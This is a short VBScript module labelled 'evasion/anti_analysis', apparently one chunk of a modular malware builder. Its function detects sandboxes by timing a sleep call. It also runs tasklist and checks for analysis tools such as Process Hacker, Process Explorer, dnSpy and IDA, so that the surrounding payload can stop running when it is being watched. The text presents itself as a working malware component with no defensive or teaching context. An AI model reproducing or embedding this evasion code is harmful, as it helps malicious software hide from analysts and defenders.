' chunk: evasion/anti_analysis
' depends: core/run_cmd
' provides: check_analysis
' format: vbscript

Function check_analysis()
    check_analysis = False
    Dim startTime
    startTime = Timer
    WScript.Sleep 1500
    Dim elapsed
    elapsed = (Timer - startTime) * 1000
    If elapsed < 1000 Then
        check_analysis = True
        Exit Function
    End If

    Dim procs
    procs = LCase(_run("tasklist /fo csv /nh"))
    Dim analysis, i
    analysis = Array("processhacker", "procexp", "autoruns", "tcpview", "regmon", "filemon", "apimonitor", "dnspy", "ida")
    For i = 0 To UBound(analysis)
        If InStr(procs, analysis(i)) > 0 Then
            check_analysis = True
            Exit Function
        End If
    Next
End Function
